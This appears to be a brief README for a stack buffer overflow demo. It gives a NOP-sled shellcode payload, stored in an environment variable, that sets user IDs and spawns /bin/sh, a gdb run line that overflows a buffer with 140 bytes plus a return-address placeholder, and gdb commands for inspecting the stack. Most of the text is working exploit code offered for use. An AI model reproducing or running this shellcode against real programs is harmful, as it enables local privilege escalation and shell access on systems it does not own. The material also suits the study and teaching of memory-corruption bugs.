# b0f demo

## Description

Here is just a project preapred for a demo. 

This puts shellcode in environment variable.

```sh
export SHELLCODE=$(python -c 'print "\x90"*100 + "\x90\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x89\xc2\x31\xc0\xb0\xa4\xcd\x80\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"')
```

Examples on debug b0f  

```sh
r$(python -c "print 'A'*140 + 'BBBB'")
```

Delete breakpoints in gdb

```sh
clear
delete
```

Search memory

```sh
x/100s $esp
x/100x $esp
```
